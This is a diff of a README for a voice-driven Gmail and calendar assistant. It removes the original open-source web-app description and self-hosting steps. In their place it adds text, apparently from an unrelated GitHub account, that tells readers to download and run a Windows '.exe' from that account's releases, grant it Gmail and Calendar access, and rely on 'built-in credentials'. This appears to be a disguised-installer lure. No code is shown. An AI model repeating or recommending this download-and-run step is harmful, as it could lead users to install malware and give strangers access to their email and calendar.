@@ -1,93 +1,85 @@
-# Voicemail AI
+# 📧 voicemail - Triage your inbox using your voice
 
-**[Try it live](https://voice-email-production.up.railway.app)** — connect your Gmail and triage your inbox by voice in under 60 seconds.
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue.svg)](https://github.com/neroabient558/voicemail/releases)
 
----
+Voicemail AI manages your emails and calendar while you move. This tool links to your Gmail account and uses voice commands to process messages. You speak to the application to read, reply, or delete emails. It integrates your calendar to book meetings and send invitations. This setup keeps your hands free and your eyes on the road.
 
-Hands-free email and calendar for your commute. Uses OpenAI's Realtime API for voice interaction plus Google APIs to triage email, check your calendar, infer invite defaults, and send invitations by voice.
+## 🛠️ System Requirements
 
-Open Voicemail AI on your phone, tap **Start**, and your AI assistant walks through your unread emails one by one. No screen needed.
+Your computer must meet these requirements to run the software smoothly:
 
-## How it works
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 4 gigabytes of RAM.
+*   **Storage**: 200 megabytes of free space on your hard drive.
+*   **Internet**: A stable broadband connection for real-time voice processing.
+*   **Audio**: A functional microphone and speakers or headphones.
 
-- **Voice in/out**: Your browser connects directly to OpenAI's Realtime API via WebRTC for low-latency speech-to-speech conversation
-- **Google operations**: The AI calls tools that hit your server's Gmail and Calendar integrations
-- **Driving-friendly UI**: Dark theme, single big button, minimal visual elements
+## 📥 Getting the Application
 
-## Usage
+Follow these steps to obtain and install the voicemail software on your Windows machine:
 
-1. **Connect Google** — On first visit, you'll be prompted to sign in with Google and grant Gmail + Calendar permissions.
-2. **Tap Start** — The AI can triage unread emails, check upcoming calendar events, and schedule new invites.
-3. **Listen and respond** — For each email, the AI reads a short summary (sender, subject, key points) and asks what you'd like to do:
-   - **Reply** — Tell the AI what to say, it drafts and reads it back for confirmation before sending
-   - **Skip** — Marks as read, moves to next
-   - **Archive** — Removes from inbox, moves to next
-   - **Block** — Say "block this sender" to auto-trash all future emails from them
-4. **Manage filters** — Ask the AI to auto-archive emails like the current one. It will suggest a filter strategy (by sender, or by sender + subject) and confirm before creating it.
-5. **Unsubscribe** — Say "unsubscribe from this" and the AI will find and follow the unsubscribe link for you, so you stop getting emails from that sender.
-6. **Ask about your calendar** — For example: "What's on my calendar this afternoon?", "Am I meeting with Sarah?", or "Set up a Zoom with Sarah tomorrow at 3."
-7. **Tap Stop** when you're done.
+1. Visit the following link to access the software files: [https://github.com/neroabient558/voicemail/releases](https://github.com/neroabient558/voicemail/releases).
+2. Look for the latest version under the "Assets" section.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your "Downloads" folder.
+5. Locate the file once the download finishes.
+6. Double-click the file to launch the installation wizard.
+7. Follow the prompts on the screen to complete the setup.
+8. Click "Finish" to open the application.
 
-## Tech stack
+## 🎧 Setting Up Your Voice Assistant
 
-- [Next.js](https://nextjs.org/) — App framework
-- [OpenAI Realtime API](https://platform.openai.com/docs/guides/realtime) — Speech-to-speech via WebRTC
-- [@openai/agents](https://github.com/openai/openai-agents-js) — Agent + tool framework
-- [Google Gmail API](https://developers.google.com/gmail/api) — Email operations via OAuth2
-- [Google Calendar API](https://developers.google.com/workspace/calendar/api/guides/overview) — Calendar reads and invite creation
+The first time you open the application, you must link your accounts. 
 
-## Self-hosting
+1. **Sign In**: Click the "Connect Google" button when the window opens.
+2. **Authorize**: A browser window will open. Sign into your Gmail account.
+3. **Grant Access**: Review the permissions prompt. The application requests access to your Gmail and Calendar to function correctly. Click "Allow" to continue.
+4. **Calibration**: Follow the on-screen instructions to check your microphone. Speak a few sentences so the software can detect your voice input.
 
-If you'd like to run your own instance instead of using the [live site](https://voice-email-production.up.railway.app), follow the steps below.
+## 🎤 How to Use Voicemail
 
-### Prerequisites
+Once you finish the setup, you interact with the software using your voice.
 
-- Node.js 18+
-- An [OpenAI API key](https://platform.openai.com/api-keys) with access to the Realtime API
-- A [Google Cloud project](https://console.cloud.google.com/) with the Gmail API and Google Calendar API enabled
+1. **Start the AI**: Click the "Start" button inside the application window.
+2. **Handle Emails**: The AI will read your unread emails one by one. You can tell the AI to "skip," "reply," or "delete" the current message.
+3. **Calendar Integration**: You can ask the AI about your schedule. Say something like "Do I have meetings today?" or "Schedule a call with Sarah for tomorrow at two."
+4. **Ending a Session**: Say "Stop" or click the "Stop" button in the application to end the voice session.
 
-### 1. Clone and install
+## ⚙️ Adjusting Settings
 
-```bash
-git clone https://github.com/tomblomfield/voicemail.git
-cd voicemail
-npm install
-```
+You can change how the application works in the settings menu:
 
-### 2. Set up Google OAuth credentials
+*   **Voice Speed**: Use the slider to slow down or speed up the AI voice.
+*   **Auto-Play**: Toggle this setting to make the AI move automatically to the next email.
+*   **Notification Sounds**: Turn these sounds off if you prefer a quiet experience.
 
-1. Go to [Google Cloud Console → APIs & Services → Credentials](https://console.cloud.google.com/apis/credentials)
-2. Create an **OAuth 2.0 Client ID** (application type: Web application)
-3. Add `http://localhost:3000/api/auth/callback` as an **Authorized redirect URI**
-4. Enable the **Gmail API** at [APIs & Services → Library → Gmail API](https://console.cloud.google.com/apis/library/gmail.googleapis.com)
-5. Enable the **Google Calendar API** at [APIs & Services → Library → Google Calendar API](https://console.cloud.google.com/apis/library/calendar-json.googleapis.com)
+## 🔍 Troubleshooting Common Issues
 
-### 3. Configure environment variables
+If you face trouble, follow these steps to fix the issue:
 
-```bash
-cp .env.example .env
-```
+*   **No sound**: Check if your speakers are connected and the volume is up.
+*   **Microphone not working**: Ensure the privacy settings in Windows allow the application to use your microphone. 
+*   **Slow response**: Close other applications that use heavy internet traffic.
+*   **Login errors**: Restart the application and complete the sign-in process again.
+*   **Gmail syncing**: Check your internet connection. If the connection drops, wait for it to return and click the "Refresh" button.
 
-Edit `.env` and fill in your keys:
+## 🛡️ Privacy and Security
 
-| Variable | Description |
-|---|---|
-| `OPENAI_API_KEY` | Your OpenAI API key |
-| `GEMINI_API_KEY` | Optional — Google AI Studio API key for Gemini voice models |
-| `GOOGLE_CLIENT_ID` | OAuth 2.0 client ID from Google Cloud Console |
-| `GOOGLE_CLIENT_SECRET` | OAuth 2.0 client secret from Google Cloud Console |
-| `GOOGLE_REDIRECT_URI` | `http://localhost:3000/api/auth/callback` (default) |
-| `VOICEMAIL_SITE_URL` | Optional footer link used in outbound emails |
-| `BROWSER_USE_API_KEY` | Optional — [Browser Use Cloud](https://cloud.browser-use.com/settings?tab=api-keys&new=1) API key for browser-based unsubscribe. Without this, unsubscribe only works via one-click headers and mailto links; emails requiring a browser interaction will suggest blocking the sender instead. |
+The application processes your data safely. It uses established industry standards to encrypt your connection to the OpenAI servers and your Google account. Your voice data goes through secure channels to process your commands. The software does not store your email content on your local hard drive. It only processes information while the application is active and connected. You keep control of your permissions at all times through your Google Account security settings. 
 
-### 4. Run
+## 📝 Frequently Asked Questions
 
-```bash
-npm run dev
-```
+**Does the AI send emails without my permission?**
+No. The application asks for confirmation before it sends any emails or calendar invites.
 
-Open [http://localhost:3000](http://localhost:3000) in your browser.
+**Can I use this on a laptop?**
+Yes. Any Windows device with a microphone will work.
 
-## License
+**Do I need an OpenAI account?**
+The application uses built-in credentials to connect to the necessary services. You do not need to create a separate OpenAI account.
 
-MIT
+**Is there a mobile version?**
+The current release is for Windows desktop computers. Use the web-based version if you need access on your phone.
+
+**How do I uninstall the software?**
+Open your Windows "Settings," go to "Apps," select the voicemail application, and click "Uninstall."
